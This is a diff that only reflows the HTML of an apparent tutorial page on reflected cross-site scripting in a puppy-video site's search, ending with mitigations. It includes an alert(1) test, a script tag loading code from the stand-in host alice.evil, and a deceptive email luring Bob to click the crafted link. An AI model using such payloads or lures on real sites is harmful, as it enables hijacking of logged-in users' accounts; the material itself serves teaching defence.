@@ -127,7 +127,18 @@
 </div>
 
 
-      <p>Let’s say Joe owns a website that allows you to log on, view puppy videos, and save them to your account.</p><p>Whenever a user searches on that website, they are redirected to <code>https://example.com/search?q=brown+puppies</code>.</p><p>If a user’s search doesn’t match anything, than they see a message along the lines of:</p><blockquote id="3b9ae8c1-dece-478b-9ba3-724312d32285" class="">Your search (brown puppies), didn’t match anything. Try again.</blockquote><p>On the backend, that message is displayed like this:</p>
+      
+<p>Let’s say Joe owns a website that allows you to log on, view puppy videos, and save them to your account.
+</p>
+<p>Whenever a user searches on that website, they are redirected to <code>https://example.com/search?q=brown+puppies</code>.
+</p>
+<p>If a user’s search doesn’t match anything, than they see a message along the lines of:
+</p>
+<blockquote id="3b9ae8c1-dece-478b-9ba3-724312d32285" class="">Your search (brown puppies), didn’t match anything. Try again.
+</blockquote>
+<p>On the backend, that message is displayed like this:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">if(!searchResults){
@@ -137,7 +148,14 @@
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>However, when Alice searches for <code>&lt;h1&gt;headings&lt;/h1&gt;</code>, she gets this back:</p><blockquote id="86afab18-0afd-41f1-bd73-976a71feb3c0" class="">Your search (headings) didn’t match anything. Try again.</blockquote><p>Raw HTML:</p>
+</div>
+<p>However, when Alice searches for <code>&lt;h1&gt;headings&lt;/h1&gt;</code>, she gets this back:
+</p>
+<blockquote id="86afab18-0afd-41f1-bd73-976a71feb3c0" class="">Your search (headings) didn’t match anything. Try again.
+</blockquote>
+<p>Raw HTML:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">Your search (&lt;b&gt;&lt;h1&gt;headings&lt;/h1&gt;&lt;/b&gt;) didn&#39;t match anything. Try again.</pre>
@@ -145,7 +163,33 @@
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>Than Alice searches for <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, she sees:</p><blockquote id="034af125-ff62-4c73-b555-3bfd977fee2e" class="">Your search (), didn’t match anything. Try again.</blockquote><p>And:</p><img class="img" src="/img/6dee0a4b64efe402ae5f80cf6cb0cc6a14343e24.png"><p>Than Alice searches for <code>&lt;script src = &quot;https://alice.evil/puppy_xss.js&gt;&lt;/script&gt;really cute puppies</code>, and copies the link in her address bar, and than emails Bob:</p><blockquote id="266f57d0-e60c-4a23-8bbe-7a923734fa52" class="">Bob,</blockquote><p>When I search for <a href="https://example.com/search?q=%3Cscript+src+=+%22https://alice.evil/puppy_xss.js%3E%3C/script%3Ereally+cute+puppies">cute puppies</a>, nothing happens!</p><p>Than Alice sucessfully gets Bob to run her script while Bob is logged on to his account.</p><h1 id="12b91065-b66f-40af-b1ad-063a00951a04" class="">Mitigation:<a class="header-anchor" href="#12b91065-b66f-40af-b1ad-063a00951a04" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M5.88.03c-.18.01-.36.03-.53.09-.27.1-.53.25-.75.47a.5.5 0 1 0 .69.69c.11-.11.24-.17.38-.22.35-.12.78-.07 1.06.22.39.39.39 1.04 0 1.44l-1.5 1.5c-.44.44-.8.48-1.06.47-.26-.01-.41-.13-.41-.13a.5.5 0 1 0-.5.88s.34.22.84.25c.5.03 1.2-.16 1.81-.78l1.5-1.5c.78-.78.78-2.04 0-2.81-.28-.28-.61-.45-.97-.53-.18-.04-.38-.04-.56-.03zm-2 2.31c-.5-.02-1.19.15-1.78.75l-1.5 1.5c-.78.78-.78 2.04 0 2.81.56.56 1.36.72 2.06.47.27-.1.53-.25.75-.47a.5.5 0 1 0-.69-.69c-.11.11-.24.17-.38.22-.35.12-.78.07-1.06-.22-.39-.39-.39-1.04 0-1.44l1.5-1.5c.4-.4.75-.45 1.03-.44.28.01.47.09.47.09a.5.5 0 1 0 .44-.88s-.34-.2-.84-.22z"></path></svg></a></h1><ol id="9d964445-4e1a-402d-9a35-696851ea4a2c" class="numbered-list" start="1"><li>Escape all angle brackets in searches before returning the search term when no results are found.</li><li>Don’t return the search term when no results are found.</li><li><strong>Add a </strong><a href="https://stackoverflow.com/q/30280370/6560716"><strong>Content Security Policy</strong></a><strong> that refuses to load active content from other domains</strong></li></ol>
+</div>
+<p>Than Alice searches for <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, she sees:
+</p>
+<blockquote id="034af125-ff62-4c73-b555-3bfd977fee2e" class="">Your search (), didn’t match anything. Try again.
+</blockquote>
+<p>And:
+</p>
+<img class="img" src="/img/6dee0a4b64efe402ae5f80cf6cb0cc6a14343e24.png">
+<p>Than Alice searches for <code>&lt;script src = &quot;https://alice.evil/puppy_xss.js&gt;&lt;/script&gt;really cute puppies</code>, and copies the link in her address bar, and than emails Bob:
+</p>
+<blockquote id="266f57d0-e60c-4a23-8bbe-7a923734fa52" class="">Bob,
+</blockquote>
+<p>When I search for <a href="https://example.com/search?q=%3Cscript+src+=+%22https://alice.evil/puppy_xss.js%3E%3C/script%3Ereally+cute+puppies">cute puppies</a>, nothing happens!
+</p>
+<p>Than Alice sucessfully gets Bob to run her script while Bob is logged on to his account.
+</p>
+  <h1 id="12b91065-b66f-40af-b1ad-063a00951a04" class="">Mitigation:
+  <a class="header-anchor" href="#12b91065-b66f-40af-b1ad-063a00951a04" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M5.88.03c-.18.01-.36.03-.53.09-.27.1-.53.25-.75.47a.5.5 0 1 0 .69.69c.11-.11.24-.17.38-.22.35-.12.78-.07 1.06.22.39.39.39 1.04 0 1.44l-1.5 1.5c-.44.44-.8.48-1.06.47-.26-.01-.41-.13-.41-.13a.5.5 0 1 0-.5.88s.34.22.84.25c.5.03 1.2-.16 1.81-.78l1.5-1.5c.78-.78.78-2.04 0-2.81-.28-.28-.61-.45-.97-.53-.18-.04-.38-.04-.56-.03zm-2 2.31c-.5-.02-1.19.15-1.78.75l-1.5 1.5c-.78.78-.78 2.04 0 2.81.56.56 1.36.72 2.06.47.27-.1.53-.25.75-.47a.5.5 0 1 0-.69-.69c-.11.11-.24.17-.38.22-.35.12-.78.07-1.06-.22-.39-.39-.39-1.04 0-1.44l1.5-1.5c.4-.4.75-.45 1.03-.44.28.01.47.09.47.09a.5.5 0 1 0 .44-.88s-.34-.2-.84-.22z"></path></svg></a>
+  </h1>
+  <ol id="9d964445-4e1a-402d-9a35-696851ea4a2c" class="numbered-list" start="1">
+    <li>Escape all angle brackets in searches before returning the search term when no results are found.
+    </li>
+    <li>Don’t return the search term when no results are found.
+    </li>
+    <li><strong>Add a </strong><a href="https://stackoverflow.com/q/30280370/6560716"><strong>Content Security Policy</strong></a><strong> that refuses to load active content from other domains</strong>
+    </li>
+  </ol>
 
       <div class="forum-link">
   Found a mistake? Have a question or improvement idea?
